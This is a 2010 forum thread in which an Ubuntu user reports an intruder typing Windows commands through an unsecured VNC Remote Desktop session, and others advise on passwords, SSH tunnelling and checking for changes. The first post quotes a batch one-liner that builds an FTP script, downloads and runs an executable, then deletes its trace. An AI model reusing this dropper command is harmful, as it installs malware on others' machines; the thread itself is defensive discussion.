---
title: "Unwanted Remote Desktop Access &amp; attempted hack"
date: 2010-07-20
forum: Security
---

### Post by InkyDinky on 2010-07-20
I was running ubuntu 10.04 on a school laptop connected to the network.
I was editing a file in emacs on an ssh connection to a school server when all of a sudden I see the remote desktop graphic (a thing that looks like a widescreen monitor) pop up in the top panel. A second later it announces that someone else has connected to my computer with 'ffff:someip'. I'm not sure of the specifics because I was too shocked. I do remember it started with some number of f's before a :.
The hacker then started typing 
```
%systemroot%\system32\cmd.exe
del eq&e

```
I promptly yanked out the ethernet cable before anything else could be typed.
I then went in and changed the Remote Desktop preferences to not allow anyone in.
I'm guessing that I cut the hacker off from fully entering in a command similar to this ```

%systemroot%\system32\cmd.exe
del eq&echo open 0.0.0.0 13643 >> eq&echo user 13302 30046 >> eq &echo get
mswinsvcr.exe >> eq &echo quit >> eq &ftp -n -s:eq &mswinsvcr.exe &del eq
```
which I found here:
[http://www.eggheadcafe.com/software/aspnet/31037492/pc-typed-by-itself-syst.aspx]("http://www.eggheadcafe.com/software/aspnet/31037492/pc-typed-by-itself-syst.aspx")

I have several questions.
How concerned should I be?
It appears to be a windows hack. 
Did I prevent any damage from occurring?

Is Remote Desktop really that easy to connect to another persons computer? I know this question is bait in a way. On my home machines I only allow vnc via ssh tunnels and that is through a router with proper port forwarding for the ssh ports and very few other ports forwarded. Such an attack has never happened to me at home. Is this possibly due to my setup or was I just lucky no one picked my computer to hack?
So is the ssh tunnel & port forwarding a sufficiently safe setup or am I still at risk? 
What degree of protection does the ssh tunnel and port forwarding provide?
What else should I do to make my current home setup even more secure?
 
The text I wrote above was the only text typed into the terminal. 
Because the attack was over Remote Desktop, what is the possibility that it was a bot? The text appeared slow enough for me to think that there was a person rather than a machine/program typing in the text.
Does the Remote Desktop connection in a way provide a level of abstraction that prevents scripts as commands must be typed in through the Remote Desktop connection (vs. a ssh connection where a script might more easily be uploaded and executed)?
In the end I'm curious as to what else might have been accessed over the connection or if it was probably just restricted to the hacker attempting to run some windows commands? Since they connected via Remote Desktop and I saw the connection pop up and the typing begin in my terminal, did I see everything that the hacker attempted to perform?

Any thoughts as to what to do?
Am I correct in my research in finding that there is no log for Remote Desktop connections and therefore I can't find the ip they were connecting from?

I'd appreciate any other thoughts or comments as I learn from this experience.  I don't have any valuable information on this school computer so I'm not too concerned about anything being compromised.
However, I would like to use this as a wake up call to myself to prevent unwanted access on my home computers.

Thanks

---

### Post by CharlesA on 2010-07-20
The "remote desktop" on Ubuntu Desktop is just VNC. It's has the same vulnerabilities as VNC does.

vino (the program that is used for Remote Desktop) doesn't keep any logs.

Just keep it off and you should be fine.

If you must have the remote desktop enabled, turn on "you must allow each access to this machine" and "require the user to enter this password."

Use a strong password.

---

### Post by mikewhatever on 2010-07-20
If you have Remote Desktop enabled, at least have it password protected. I know it's not convenient when working on a home LAN behind the router, but you should know better now.

---

### Post by HermanAB on 2010-07-20
These forums are full of tales of woe about VNC.  It is insecure.  Don't use it.

---

### Post by movieman on 2010-07-20
> **HermanAB said:**
> These forums are full of tales of woe about VNC.  It is insecure.  Don't use it.

It's OK so long as you only listen to localhost and use ssh forwarding for any remote connection. But you should never allow VNC to listen to an external IP address.

I can only presume that Ubuntu is doing something wrong with its default configuration if this many people are getting hacked through VNC.

---

### Post by CharlesA on 2010-07-20
I figure most are just checking the "configure network automatically to accept connections"

That and there is no password set by default when remote desktop is enabled.

---

### Post by HermanAB on 2010-07-21
The problem with VNC is that is uses Plug and Play to automatically configure home routers to forward the port.  So VNC is simply bad news for a first time user.  

I think the Ubuntu developers are very irresponsible by putting this horrid application on the default distribution and allowing short passwords as well, which makes for a sure fire hackable system.

---

### Post by rookcifer on 2010-07-21
> **InkyDinky said:**
> 
Is Remote Desktop really that easy to connect to another persons computer? 

Yes it is when you ***don't secure it with a password!***

I have said this before and it's obviously still true: There should be some kind of warning box pop-up warning the user to create a password when they activate remote desktop.  This obviously is not done and too many users are getting compromised because they don't know better.

Ubuntu devs, are you listening?

---

### Post by bodhi.zazen on 2010-07-21
> **HermanAB said:**
> I think the Ubuntu developers are very irresponsible by putting this horrid application on the default distribution and allowing short passwords as well, which makes for a sure fire hackable system.

+1 , security should be tightened on this service in more then one way.

---

### Post by cliffdodger on 2010-07-21
If I'm reading this correctly you're probably fine since it appears the user was entering windows commands on a linux command line (or was your remote emacs terminal on a windows machine and was that one what the hacker got into?) - obviously windows commands won't behave as intended and should generally just return an error on the linux shell.

That said - you might want to write or find a shell or php/perl/python script that checks the 'date modified' data for files, run it on your computer and have it generate a report of all files modified within the last 'x' days or day. Also run one that generates a list of all new files created within the last day (from the time of the attack)

Now some system files get modified a lot so this isn't 100% reliable or quick. But it can give you a glimpse of things they may have edited or files they may have left (if they had the chance) and give you a little more piece of mind that you don't need to reformat and reinstall from scratch or your last backup.

---

### Post by The Cog on 2010-07-21
> **HermanAB said:**
> The problem with VNC is that is uses Plug and Play to automatically configure home routers to forward the port.  So VNC is simply bad news for a first time user.  

I think the Ubuntu developers are very irresponsible by putting this horrid application on the default distribution and allowing short passwords as well, which makes for a sure fire hackable system.
I agree. In my opinion, its default should be to only listen on the loopback address ::1. That way it can only be reached over an SSH tunnel. But not only is that not the default, it is not a configuration option at all - you have to install and configure a firewall in order to protect the service.

---

### Post by InkyDinky on 2010-07-23
I truly appreciate all of your responses and advice in educating me concerning this issue.
As far as I can tell since they were issuing windows commands in a terminal that was running emacs that nothing to be concerned about was ever executed on my machine or on the machine I was remotely logged in to.

Thanks,
Nick

---

